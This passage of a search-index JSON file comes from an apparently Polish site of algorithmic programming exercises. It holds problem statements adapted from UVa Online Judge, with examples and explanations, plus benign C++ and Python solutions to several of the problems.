na wype\u0142nienie ostatniego rz\u0119du - na przyk\u0142ad, \\(6\\) wojownik\u00f3w mog\u0142oby by\u0107 rozmieszczonych w trzech rz\u0119dach, ale podobnie mog\u0142oby by\u0107 rozmieszczonych \\(7\\), \\(8\\), a nawet \\(9\\) wojownik\u00f3w.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/116/11614.pdf</p>"},{"location":"algorithmic-exercises/level-1/byte-warriors/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/byte-warriors/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, rozmiar oddzia\u0142u, \\(0\\leq n\\leq 10^{18}\\).</li> </ul>"},{"location":"algorithmic-exercises/level-1/byte-warriors/#wynik","title":"Wynik","text":"<ul> <li>Liczba wierszy potrzebna, by uformowa\u0107 oddzia\u0142.</li> </ul>"},{"location":"algorithmic-exercises/level-1/byte-warriors/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-1/byte-warriors/#dane_1","title":"Dane","text":"<pre><code>3\n</code></pre> <p>Wynik: \\(2\\)</p>"},{"location":"algorithmic-exercises/level-1/byte-warriors/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-1/byte-warriors/#dane_2","title":"Dane","text":"<pre><code>8\n</code></pre> <p>Wynik: \\(3\\)</p>"},{"location":"algorithmic-exercises/level-1/byte-warriors/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"algorithmic-exercises/level-1/byte-warriors/#dane_3","title":"Dane","text":"<pre><code>10\n</code></pre> <p>Wynik: \\(4\\)</p>"},{"location":"algorithmic-exercises/level-1/different-digits/","title":"R\u00f3\u017cne cyfry","text":"<p>Twoim zadaniem jest okre\u015blenie ilo\u015bci liczb w zadanym przedziale, kt\u00f3re sk\u0142adaj\u0105 si\u0119 wy\u0142\u0105cznie z unikalnych cyfr, to znaczy, w ich zapisie cyfry nie powtarzaj\u0105 si\u0119. Na przyk\u0142ad, liczba \\(123\\) sk\u0142ada si\u0119 z r\u00f3\u017cnych cyfr, podczas gdy liczba \\(100\\) ju\u017c nie, ze wzgl\u0119du na powtarzaj\u0105cy si\u0119 znak \\(0\\).</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/125/12527.pdf</p>"},{"location":"algorithmic-exercises/level-1/different-digits/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/different-digits/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - liczby ca\u0142kowite z przedzia\u0142u \\([1,5000]\\)</li> </ul>"},{"location":"algorithmic-exercises/level-1/different-digits/#wynik","title":"Wynik","text":"<ul> <li>Ilo\u015b\u0107 wszystkich liczb z przedzia\u0142u \\([a,b]\\), kt\u00f3re sk\u0142adaj\u0105 si\u0119 wy\u0142\u0105cznie z r\u00f3\u017cnych cyfr.</li> </ul>"},{"location":"algorithmic-exercises/level-1/different-digits/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-1/different-digits/#dane_1","title":"Dane","text":"<pre><code>87 104\n</code></pre>"},{"location":"algorithmic-exercises/level-1/different-digits/#wynik_1","title":"Wynik","text":"<pre><code>14\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/different-digits/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>Z przedzia\u0142u \\([87,104]\\) nast\u0119puj\u0105ce liczby sk\u0142adaj\u0105 si\u0119 wy\u0142\u0105cznie z r\u00f3\u017cnych cyfr:</p> <p>\\(87,89,90,91,92,93,94,95,96,97,98,102,103,104\\)</p>"},{"location":"algorithmic-exercises/level-1/happy-jumps/","title":"R\u00f3\u017cnice w sekwencji","text":"<p>Masz dan\u0105 sekwencj\u0119 \\(n\\) liczb ca\u0142kowitych. Twoim zadaniem jest sprawdzi\u0107, czy przy obliczaniu warto\u015bci bezwzgl\u0119dnych r\u00f3\u017cnic pomi\u0119dzy ka\u017cd\u0105 par\u0105 kolejnych element\u00f3w sekwencji, uzyskamy wszystkie liczby od \\(1\\) do \\(n-1\\) w\u0142\u0105cznie.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/100/10038.pdf</p>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/happy-jumps/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna z przedzia\u0142u \\([1,3000]\\)</li> <li>\\(tab[n]\\) - sekwencja \\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#wynik","title":"Wynik","text":"<ul> <li>\"TAK\" je\u017celi sekwencja spe\u0142nia opisane wy\u017cej wymaganie, lub \"NIE\" w przeciwnym przypadku</li> </ul>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-1/happy-jumps/#dane_1","title":"Dane","text":"<pre><code>4\n1 4 2 3\n</code></pre>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#wynik_1","title":"Wynik","text":"<pre><code>TAK\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>Przyjrzyjmy si\u0119 warto\u015bciom bezwzgl\u0119dnym r\u00f3\u017cnic pomi\u0119dzy s\u0105siednimi elementami sekwencji:</p> <ul> <li>\\(|1-4|=3\\)</li> <li>\\(|4-2|=2\\)</li> <li>\\(|2-3|=1\\)</li> </ul> <p>Jak wida\u0107 otrzymali\u015bmy wszystkie warto\u015bci z przedzia\u0142u \\([1,n-1]\\), czyli z przedzia\u0142u \\([1,3]\\).</p>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-1/happy-jumps/#dane_2","title":"Dane","text":"<pre><code>5\n1 4 2 -1 6\n</code></pre>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#wynik_2","title":"Wynik","text":"<pre><code>NIE\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/happy-jumps/#wyjasnienie_1","title":"Wyja\u015bnienie","text":"<p>Przyjrzyjmy si\u0119 warto\u015bciom bezwzgl\u0119dnym r\u00f3\u017cnic pomi\u0119dzy s\u0105siednimi elementami sekwencji:</p> <ul> <li>\\(|1-4|=3\\)</li> <li>\\(|4-2|=2\\)</li> <li>\\(|2-(-1)|=3\\)</li> <li>\\(|-1-6|=7\\)</li> </ul> <p>Jak wida\u0107 nie otrzymali\u015bmy wszystkich warto\u015bci z przedzia\u0142u \\([1,n-1]\\), czyli z przedzia\u0142u \\([1,4]\\)</p>"},{"location":"algorithmic-exercises/level-1/image-coding/","title":"Kodowanie obrazka","text":"<p>Grafika komputerowa jest niezwykle istotnym obszarem informatyki. Poniewa\u017c przechowujemy na komputerach mn\u00f3stwo zdj\u0119\u0107, istotne jest efektywne reprezentowanie ich w pami\u0119ci komputera. W tym zadaniu skupimy si\u0119 na szczeg\u00f3lnym przypadku kodowania grafiki. Grafik\u0119 przedstawiamy jako prostok\u0105tn\u0105 tablic\u0119 liter alfabetu angielskiego, gdzie ka\u017cda litera koduje jeden region. Identyczne regiony s\u0105 reprezentowane przez takie same litery.</p> <p>Twoje zadanie polega na obliczeniu, ile bajt\u00f3w pami\u0119ci jest potrzebnych do reprezentacji tak zaprezentowanej grafiki. Zasady s\u0105 proste: obszar o najwy\u017cszym priorytecie reprezentowany jest za pomoc\u0105 2 bajt\u00f3w, natomiast wszystkie pozosta\u0142e obszary za pomoc\u0105 jednego bajta.</p> <p>Obszar o najwy\u017cszym priorytecie to taki, kt\u00f3ry wyst\u0119puje najcz\u0119\u015bciej, czyli litera reprezentuj\u0105ca ten obszar pojawia si\u0119 najwi\u0119cej razy w opisie grafiki. Je\u017celi kilka obszar\u00f3w ma tak\u0105 sam\u0105, najwi\u0119ksz\u0105 liczb\u0119 wyst\u0105pie\u0144, to wszystkie z nich uznajemy za obszary o najwy\u017cszym priorytecie.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/115/11588.pdf</p>"},{"location":"algorithmic-exercises/level-1/image-coding/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/image-coding/#dane","title":"Dane","text":"<ul> <li>\\(h, w\\) - wymiary tablicy, jej wysoko\u015b\u0107 i szeroko\u015b\u0107</li> <li>\\(pix[h][w]\\) - opis grafiki, tablica dwuwymiarowa o wymiarach \\(h\\times w\\), kt\u00f3rej ka\u017cdym elementem jest wielka litera alfabetu angielskiego</li> </ul>"},{"location":"algorithmic-exercises/level-1/image-coding/#wynik","title":"Wynik","text":"<ul> <li>Liczba bajt\u00f3w potrzebna do reprezentacji podanej grafiki</li> </ul>"},{"location":"algorithmic-exercises/level-1/image-coding/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-1/image-coding/#dane_1","title":"Dane","text":"<pre><code>1\n5 4\nABCD\nABCA\nEFAC\nBCAG\nAZIP\n</code></pre>"},{"location":"algorithmic-exercises/level-1/image-coding/#wynik_1","title":"Wynik","text":"<pre><code>26\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/image-coding/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>Najcz\u0119\u015bciej wyst\u0119puj\u0105cym regionem jest region A. Wyst\u0119puje on dok\u0142adnie \\(6\\) razy. Oznacza to, \u017ce region A kodujemy za pomoc\u0105 \\(2\\) bajt\u00f3w, a wszystkie pozosta\u0142e (kt\u00f3rych jest \\(14\\)), za pomoc\u0105 \\(1\\) bajta. St\u0105d otrzymujemy wynik: \\(6*2 + 14*1 = 12 + 14 = 26\\)</p>"},{"location":"algorithmic-exercises/level-1/newspaper/","title":"Gazeta","text":"<p>Gazeta \"Bitek\" z Bajtkowa jest niezwykle popularna, nawet w swoim tradycyjnym, papierowym formacie. W zwi\u0105zku z tym wiele os\u00f3b przesy\u0142a do redakcji swoje og\u0142oszenia, kt\u00f3re maj\u0105 zosta\u0107 umieszczone w nast\u0119pnym wydaniu. Do tej pory stawka by\u0142a prosta: sta\u0142a op\u0142ata za ka\u017cde og\u0142oszenie, zale\u017cna od liczby znak\u00f3w. Wydawca \"Bitek\" zauwa\u017cy\u0142 jednak, \u017ce r\u00f3\u017cne znaki zu\u017cywaj\u0105 r\u00f3\u017cne ilo\u015bci tuszu, co oznacza, \u017ce koszty druku dla ka\u017cdego z nich r\u00f3wnie\u017c s\u0105 r\u00f3\u017cne! Dlatego postanowi\u0142 zaktualizowa\u0107 cennik i ustali\u0107 koszt druku ka\u017cdego znaku. Teraz op\u0142ata za og\u0142oszenie jest r\u00f3wna sumie koszt\u00f3w wszystkich znak\u00f3w zawartych w danym og\u0142oszeniu.</p> <p>Twoje zadanie polega na obliczeniu, ile wyniesie op\u0142ata za okre\u015blone og\u0142oszenie wed\u0142ug nowego cennika.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/113/11340.pdf</p>"},{"location":"algorithmic-exercises/level-1/newspaper/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/newspaper/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba znak\u00f3w</li> <li>\\((z_1, c_1), (z_2, c_2), ..., (z_n, c_n)\\) - cennik: pary znak oraz cena znaku, podana w groszach</li> <li>\\(wyraz\\) - ci\u0105g znak\u00f3w, ma\u0142ych i/lub wielkich liter alfabetu angielskiego, bez spacji i innych bia\u0142ych znak\u00f3w</li> </ul>"},{"location":"algorithmic-exercises/level-1/newspaper/#wynik","title":"Wynik","text":"<ul> <li>Op\u0142ata za \\(wyraz\\), podana w z\u0142ot\u00f3wkach, wedle nowego cennika. Zak\u0142adamy, \u017ce ka\u017cdy znak z wyrazu pojawi si\u0119 w cenniku.</li> </ul>"},{"location":"algorithmic-exercises/level-1/newspaper/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-1/newspaper/#dane_1","title":"Dane","text":"<pre><code>6\na 5\nl 25\nm 30\nk 50\no 10\nt 1\nalamakota\n</code></pre>"},{"location":"algorithmic-exercises/level-1/newspaper/#wynik_1","title":"Wynik","text":"<pre><code>1.36\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/newspaper/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>W wyrazie alamakota mo\u017cemy wyr\u00f3\u017cni\u0107:</p> <ul> <li>\\(4\\) litery a</li> <li>\\(1\\) liter\u0119 l</li> <li>\\(1\\) liter\u0119 m</li> <li>\\(1\\) liter\u0119 k</li> <li>\\(1\\) liter\u0119 o</li> <li>\\(1\\) liter\u0119 t</li> </ul> <p>Daje nam to: \\(4*5+1*25+1*30+1*50+1*10+1*1=136\\) groszy, czyli \\(1.36\\) z\u0142oty.</p>"},{"location":"algorithmic-exercises/level-1/odd-sum/","title":"Suma nieparzystych","text":"<p>Dla zadanego przedzia\u0142u podaj sum\u0119 wszystkich nieparzystych liczb z tego przedzia\u0142u.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/107/10783.pdf</p>"},{"location":"algorithmic-exercises/level-1/odd-sum/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/odd-sum/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - liczby ca\u0142kowite z przedzia\u0142u \\([0,100]\\)</li> </ul>"},{"location":"algorithmic-exercises/level-1/odd-sum/#wynik","title":"Wynik","text":"<ul> <li>Suma wszystkich liczb nieparzystych z przedzia\u0142u \\([a,b]\\) </li> </ul>"},{"location":"algorithmic-exercises/level-1/odd-sum/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-1/odd-sum/#dane_1","title":"Dane","text":"<pre><code>3 9\n</code></pre>"},{"location":"algorithmic-exercises/level-1/odd-sum/#wynik_1","title":"Wynik","text":"<pre><code>24\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/odd-sum/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>\\(3+5+7+9=24\\)</p>"},{"location":"algorithmic-exercises/level-1/parentheses/","title":"Nawiasy","text":"<p>Dany jest ci\u0105g z\u0142o\u017cony z nawias\u00f3w okr\u0105g\u0142ych () oraz kwadratowych []. Twoim celem jest sprawdzenie, czy ci\u0105g zawiera poprawne nawiasowanie, czy te\u017c nie. Ci\u0105g uznajemy za poprawny, gdy:</p> <ul> <li>jest pustym ci\u0105giem,</li> <li>je\u017celi \\(A\\) i \\(B\\) s\u0105 poprawne, to \\(AB\\) tak\u017ce jest poprawne,</li> <li>je\u017celi \\(A\\) jest poprawne, to \\((A)\\) oraz \\([A]\\) tak\u017ce s\u0105 poprawne.</li> </ul> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/6/673.pdf</p>"},{"location":"algorithmic-exercises/level-1/parentheses/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/parentheses/#wejscie","title":"Wej\u015bcie","text":"<ul> <li>\\(par\\) - ci\u0105g nawias\u00f3w</li> </ul>"},{"location":"algorithmic-exercises/level-1/parentheses/#wyjscie","title":"Wyj\u015bcie","text":"<ul> <li>Informacja, czy ci\u0105g jest poprawny, czy te\u017c nie.</li> </ul>"},{"location":"algorithmic-exercises/level-1/parentheses/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-1/parentheses/#wejscie_1","title":"Wej\u015bcie","text":"<pre><code>([])\n</code></pre>"},{"location":"algorithmic-exercises/level-1/parentheses/#wyjscie_1","title":"Wyj\u015bcie","text":"<pre><code>Correct\n</code></pre>"},{"location":"algorithmic-exercises/level-1/parentheses/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-1/parentheses/#wejscie_2","title":"Wej\u015bcie","text":"<pre><code>(([()])))\n</code></pre>"},{"location":"algorithmic-exercises/level-1/parentheses/#wyjscie_2","title":"Wyj\u015bcie","text":"<pre><code>Incorrect\n</code></pre>"},{"location":"algorithmic-exercises/level-1/parentheses/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"algorithmic-exercises/level-1/parentheses/#wejscie_3","title":"Wej\u015bcie","text":"<pre><code>([()[]()])()\n</code></pre>"},{"location":"algorithmic-exercises/level-1/parentheses/#wyjscie_3","title":"Wyj\u015bcie","text":"<pre><code>Correct\n</code></pre>"},{"location":"algorithmic-exercises/level-1/permutation/","title":"Permutacja","text":"<p>Tablice stanowi\u0105 fundament programowania, a posortowane tablice s\u0105 jednym z jego kluczowych element\u00f3w. A czym\u017ce jest posortowana tablica, je\u015bli nie pewn\u0105 permutacj\u0105 tablicy pierwotnej?</p> <p>Permutacj\u0119 tablicy mo\u017cna scharakteryzowa\u0107 wskazuj\u0105c docelow\u0105 kolejno\u015b\u0107 poszczeg\u00f3lnych element\u00f3w tablicy, a tak\u017ce ich pierwotne rozmieszczenie. Twoim zadaniem jest wygenerowanie permutowanej tablicy na podstawie tak zdefiniowanego opisu.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/4/482.pdf</p>"},{"location":"algorithmic-exercises/level-1/permutation/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/permutation/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba element\u00f3w tablicy</li> <li>\\(p_1,p_2,...,p_n\\) - opis permutacji: docelowa kolejno\u015b\u0107 element\u00f3w, unikalne (bez powt\u00f3rze\u0144) liczby ca\u0142kowite z przedzia\u0142u \\([1,n]\\)</li> <li>\\(a_1,a_2,...,a_n\\) - warto\u015bci tablicy w jej pocz\u0105tkowym u\u0142o\u017ceniu, liczby ca\u0142kowite</li> </ul>"},{"location":"algorithmic-exercises/level-1/permutation/#wynik","title":"Wynik","text":"<ul> <li>Zadana permutacja tablicy, tzn. taka, \u017ce element \\(a_i\\) znajduje si\u0119 na pozycji \\(p_i\\).</li> </ul>"},{"location":"algorithmic-exercises/level-1/permutation/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-1/permutation/#dane_1","title":"Dane","text":"<pre><code>5\n3 5 2 1 4\n20 41 84 93 12\n</code></pre>"},{"location":"algorithmic-exercises/level-1/permutation/#wynik_1","title":"Wynik","text":"<pre><code>93 84 20 12 41  \n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/permutation/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>Opis permutacji okre\u015bla nam docelow\u0105 pozycj\u0119 element\u00f3w:</p> <ul> <li>\\(20\\) na miejscu \\(3\\)</li> <li>\\(41\\) na miejscu \\(5\\)</li> <li>\\(84\\) na miejscu \\(2\\)</li> <li>\\(93\\) na miejscu \\(1\\)</li> <li>\\(12\\) na miejscu \\(4\\)</li> </ul>"},{"location":"algorithmic-exercises/level-1/robot/","title":"Robot","text":"<p>Posiadasz robota, zdolnego do poruszania si\u0119 wy\u0142\u0105cznie wzd\u0142u\u017c osi x, z mo\u017cliwo\u015bci\u0105 ruchu w lewo lub prawo. Robot rozpoczyna swoj\u0105 tras\u0119 z pozycji oznaczonej jako \\(0\\). Mo\u017ce wykona\u0107 nast\u0119puj\u0105ce instrukcje::</p> <ul> <li>LEWO - porusz si\u0119 o jedn\u0105 jednostk\u0119 w lewo,</li> <li>PRAWO - porusz si\u0119 o jedn\u0105 jednostk\u0119 w prawo,</li> <li>JAK W \\(i\\) - wykonaj taki sam ruch, jak w \\(i\\)-tej instrukcji. \\(i\\) jest zawsze liczb\u0105 naturaln\u0105 i nie przekracza numeru instrukcji, w kt\u00f3rej si\u0119 pojawia. Liczymy instrukcje od jedynki.</li> </ul> <p>Zastanawiasz si\u0119, czy robot dzia\u0142a poprawnie. Twoim zadaniem jest napisanie programu, kt\u00f3ry dla podanego zestawu instrukcji okre\u015bli pozycj\u0119, na kt\u00f3rej ostatecznie znajdzie si\u0119 robot.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/125/12503.pdf</p>"},{"location":"algorithmic-exercises/level-1/robot/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/robot/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczba instrukcji do wykonania, \\(1\\leq p\\leq 100\\).</li> <li>\\(n\\) linii zawieraj\u0105cych jedn\u0105 z instrukcji tak jak opisano wcze\u015bniej.</li> </ul>"},{"location":"algorithmic-exercises/level-1/robot/#wynik","title":"Wynik","text":"<ul> <li>Liczba ca\u0142kowita oznaczaj\u0105ca pozycj\u0119 robota po wykonaniu wszystkich instrukcji.</li> </ul>"},{"location":"algorithmic-exercises/level-1/robot/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-1/robot/#dane_1","title":"Dane","text":"<pre><code>3\nLEWO\nPRAWO\nJAK W 2\n</code></pre> <p>Wynik: \\(1\\)</p>"},{"location":"algorithmic-exercises/level-1/robot/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-1/robot/#dane_2","title":"Dane","text":"<pre><code>5\nLEWO\nJAK W 1\nJAK W 2\nJAK W 1\nJAK W 4\n</code></pre> <p>Wynik: \\(-5\\)</p>"},{"location":"algorithmic-exercises/level-1/sale/","title":"Promocja","text":"<p>W Topolandii mieszka farmer o imieniu W\u0142odzimir, kt\u00f3ry zajmuje si\u0119 sprzeda\u017c\u0105 mleka, pozyskiwanego od swoich zdrowych kr\u00f3w pas\u0105cych si\u0119 na bujnych \u0142\u0105kach tej krainy. Niedawno wprowadzi\u0142 specjaln\u0105 promocj\u0119: za oddanie \\(3\\) pustych butelek po mleku, otrzymujesz \\(1\\) pe\u0142n\u0105 butelk\u0119 mleka gratis! Ile butelek mleka jeste\u015b w stanie skonsumowa\u0107 korzystaj\u0105c z tej promocji, je\u017celi ju\u017c zakupi\u0142e\u015b \\(n\\) butelek mleka?</p> <p>PS. W\u0142odzimir z ch\u0119ci\u0105 po\u017cyczy Ci puste butelki, pod warunkiem, \u017ce potem je zwr\u00f3cisz.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/111/11150.pdf</p>"},{"location":"algorithmic-exercises/level-1/sale/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-1/sale/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba zakupionych butelek mleka z przedzia\u0142u\\([1,200]\\)</li> </ul>"},{"location":"algorithmic-exercises/level-1/sale/#wynik","title":"Wynik","text":"<ul> <li>Maksymalna liczba butelek mleka, kt\u00f3re mo\u017cna wypi\u0107, korzystaj\u0105c z promocji.</li> </ul>"},{"location":"algorithmic-exercises/level-1/sale/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-1/sale/#dane_1","title":"Dane","text":"<pre><code>8\n</code></pre>"},{"location":"algorithmic-exercises/level-1/sale/#wynik_1","title":"Wynik","text":"<pre><code>12\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-1/sale/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>Na pocz\u0105tku mamy \\(8\\) pe\u0142nych butelek mleka. Je\u017celi po\u017cyczymy jedn\u0105 pust\u0105 butelk\u0119, to mo\u017cemy nasze \\(9\\) pustych butelek wymieni\u0107 na \\(3\\) nowe. Wypijamy \\(3\\) butelki mleka i wymieniamy je na jedn\u0105 butelk\u0119 mleka. Wypijamy i j\u0105, a na ko\u0144cu oddajemy pust\u0105 butelk\u0119. Wypili\u015bmy wi\u0119c najpierw \\(8\\), potem \\(3\\) i na ko\u0144cu \\(1\\) butelk\u0119 mleka:</p> <p>\\(8+3+1=12\\)</p>"},{"location":"algorithmic-exercises/level-1/automated-checking-machine/","title":"Automated Checking Machine","text":"<p>Automated Checking Machine</p>"},{"location":"algorithmic-exercises/level-1/automated-checking-machine/#pliki-do-testow","title":"Pliki do test\u00f3w","text":"<p>dane1.txt</p> <p>wynik1.txt</p>"},{"location":"algorithmic-exercises/level-1/automated-checking-machine/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n\nint main()\n{\n    int tab[5], a;\n    bool result;\n    while (scanf(\"%d %d %d %d %d\", &amp;tab[0], &amp;tab[1], &amp;tab[2], &amp;tab[3], &amp;tab[4]) != EOF)\n    {\n        result = true;\n        for (int i = 0; i &lt; 5; i++)\n        {\n            scanf(\"%d\", &amp;a);\n            if (a == tab[i])\n            {\n                result = false;\n            }\n        }\n\n        if (result)\n        {\n            printf(\"Y\\n\");\n        }\n        else\n        {\n            printf(\"N\\n\");\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-1/automated-checking-machine/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>while True:\n    try:\n        tab1 = list(map(int, input().split()))\n        tab2 = list(map(int, input().split()))\n    except EOFError:\n        break\n\n    result = True\n    for el1, el2 in zip(tab1, tab2):\n        if el1 == el2:\n            result = False\n\n    if result:\n        print(\"Y\")\n    else:\n        print(\"N\")\n</code></pre>"},{"location":"algorithmic-exercises/level-1/search-the-khoj/","title":"Search the Khoj","text":"<p>Search the Khoj</p>"},{"location":"algorithmic-exercises/level-1/search-the-khoj/#pliki-do-testow","title":"Pliki do test\u00f3w","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-1/search-the-khoj/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main()\n{\n    int casesCount, mobileCount, dif;\n    vector&lt;string&gt; mobileNumbers;\n    string jalilNumber;\n\n    scanf(\"%d\", &amp;casesCount);\n\n    for (int caseId = 1; caseId &lt;= casesCount; ++caseId)\n    {\n        scanf(\"%d\", &amp;mobileCount);\n        printf(\"Case %d:\\n\", caseId);\n        mobileNumbers = vector&lt;string&gt;(mobileCount);\n\n        for (int i = 0; i &lt; mobileCount; ++i)\n        {\n            cin &gt;&gt; mobileNumbers[i];\n        }\n\n        cin &gt;&gt; jalilNumber;\n\n        for (auto &amp;currentNumber : mobileNumbers)\n        {\n            dif = 0;\n            for (int i = 0; i &lt; currentNumber.size(); ++i)\n            {\n                if (currentNumber[i] != jalilNumber[i])\n                {\n                    ++dif;\n                }\n            }\n\n            if (dif &lt;= 1)\n            {\n                printf(\"%s\\n\", currentNumber.c_str());\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-1/search-the-khoj/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>cases_count = int(input())\n\nfor case_id in range(1, cases_count + 1):\n    mobile_count = int(input())\n    mobile_numbers = [input() for _ in range(mobile_count)]\n    jalil_number = input()\n\n    print(f\"Case {case_id}:\")\n\n    for current_number in mobile_numbers:\n        dif = 0\n        for i in range(len(current_number)):\n            if current_number[i] != jalil_number[i]:\n                dif += 1\n\n        if dif &lt;= 1:\n            print(current_number)\n</code></pre>"},{"location":"algorithmic-exercises/level-1/strategy-game/","title":"Strategy Game","text":"<p>Strategy Game</p>"},{"location":"algorithmic-exercises/level-1/strategy-game/#pliki-do-testow","title":"Pliki do test\u00f3w","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-1/strategy-game/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main()\n{\n    int players, rounds, tmp, mx, mxIndex;\n    vector&lt;int&gt; playersPoints;\n    while (scanf(\"%d %d\", &amp;players, &amp;rounds) != EOF)\n    {\n        playersPoints = vector&lt;int&gt;(players, 0);\n        for (int j = 0; j &lt; rounds; ++j)\n        {\n            for (int i = 0; i &lt; players; ++i)\n            {\n                scanf(\"%d\", &amp;tmp);\n                playersPoints[i] += tmp;\n            }\n        }\n\n        mx = playersPoints[players - 1];\n        mxIndex = players - 1;\n        for (int i = players - 1; i &gt;= 0; --i)\n        {\n            if (playersPoints[i] &gt; mx)\n            {\n                mx = playersPoints[i];\n                mxIndex = i;\n            }\n        }\n\n        printf(\"%d\\n\", mxIndex + 1);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-1/strategy-game/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>while True:\n    try:\n        players, rounds = map(int, input().split())\n        all_points = list(map(int, input().split()))\n    except EOFError:\n        break\n\n    players_points = [0] * players\n    index = 0\n\n    for _ in range(rounds):\n        for i in range(players):\n            players_points[i] += all_points[index]\n            index += 1\n\n    mx = players_points[-1]\n    mx_index = players - 1\n    for i in range(players - 1, -1, -1):\n        if players_points[i] &gt; mx:\n            mx = players_points[i]\n            mx_index = i\n\n    print(mx_index + 1)\n</code></pre>"},{"location":"algorithmic-exercises/level-1/ultimate-mango-challenge/","title":"Ultimate Mango Challenge","text":"<p>Ultimate Mango Challenge</p>"},{"location":"algorithmic-exercises/level-1/ultimate-mango-challenge/#pliki-do-testow","title":"Pliki do test\u00f3w","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-1/ultimate-mango-challenge/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    int caseCount, mangoCount, maxEat, mangoSum, currentEat;\n    bool canEat;\n    vector&lt;int&gt; mangos;\n    